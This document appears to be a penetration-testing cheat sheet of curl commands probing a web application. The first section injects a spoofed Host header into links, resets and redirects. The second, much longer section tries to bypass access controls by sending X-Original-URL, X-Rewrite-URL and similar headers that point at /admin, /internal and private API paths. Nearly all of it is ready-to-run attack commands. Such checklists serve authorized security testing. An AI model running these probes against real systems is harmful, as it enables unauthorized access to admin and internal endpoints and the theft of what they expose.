# Per-route — every gated route, exhaustively

The route map — a header the app reads, a route the header gates.

---

## 1. The canonical-URL route — the generated links

```bash
curl -s -D - -H 'Host: canary.example' "$BASE/robots.txt" | grep -i 'location\|set-cookie'
curl -s -D - -H 'Host: canary.example' "$BASE/sitemap.xml" | grep -i 'location\|set-cookie'
curl -s -D - -H 'Host: canary.example' "$BASE/page" | grep -i 'x-cache\|x-served\|age'
curl -s -D - -H 'Host: canary.example' "$BASE/reset" | grep -i 'location\|set-cookie'
curl -s -D - -H 'Host: canary.example' "$BASE/login" | grep -i 'set-cookie'
curl -s -D - -H 'Host: canary.example' "$BASE/redirect" | grep -i 'location'
curl -s -D - -H 'Host: canary.example' "$BASE/callback" | grep -i 'location'
curl -s -D - -H 'Host: canary.example' "$BASE/verify" | grep -i 'location'
curl -s -D - -H 'Host: canary.example' "$BASE/confirm" | grep -i 'location'
```

## 2. The rewrite route — the ACL bypass

```bash
curl -i "$BASE/admin"                        # expect 403
curl -i -H 'X-Original-URL: /admin' "$BASE/" # 200 with the admin body = finding
curl -i -H 'X-Rewrite-URL: /admin' "$BASE/" # 200 with the admin body = finding
curl -i -H 'X-Forwarded-Path: /admin' "$BASE/" # 200 with the admin body = finding
curl -i -H 'X-Forwarded-Prefix: /admin' "$BASE/" # 200 with the admin body = finding
curl -i -H 'X-Original-Path: /admin' "$BASE/" # 200 with the admin body = finding
curl -i -H 'X-Real-Path: /admin' "$BASE/" # 200 with the admin body = finding
curl -i -H 'X-Original-URL: /internal' "$BASE/" # 200 with the internal body = finding
curl -i -H 'X-Original-URL: /private' "$BASE/" # 200 with the private body = finding
curl -i -H 'X-Original-URL: /api/admin' "$BASE/" # 200 with the api admin body = finding
curl -i -H 'X-Original-URL: /api/internal' "$BASE/" # 200 with the api internal body = finding
curl -i -H 'X-Original-URL: /api/private' "$BASE/" # 200 with the api private body = finding
curl -i -H 'X-Original-URL: /api/user' "$BASE/" # 200 with the api user body = finding
curl -i -H 'X-Original-URL: /api/debug' "$BASE/" # 200 with the api debug body = finding
curl -i -H 'X-Original-URL: /api/preview' "$BASE/" # 200 with the api preview body = finding
curl -i -H 'X-Rewrite-URL: /internal' "$BASE/" # 200 with the internal body = finding
curl -i -H 'X-Rewrite-URL: /private' "$BASE/" # 200 with the private body = finding
curl -i -H 'X-Rewrite-URL: /api/admin' "$BASE/" # 200 with the api admin body = finding
curl -i -H 'X-Rewrite-URL: /api/internal' "$BASE/" # 200 with the api internal body = finding
curl -i -H 'X-Rewrite-URL: /api/private' "$BASE/" # 200 with the api private body = finding
curl -i -H 'X-Rewrite-URL: /api/user' "$BASE/" # 200 with the api user body = finding
curl -i -H 'X-Rewrite-URL: /api/debug' "$BASE/" # 200 with the api debug body = finding
curl -i -H 'X-Rewrite-URL: /api/preview' "$BASE/" # 200 with the api preview body = finding
```
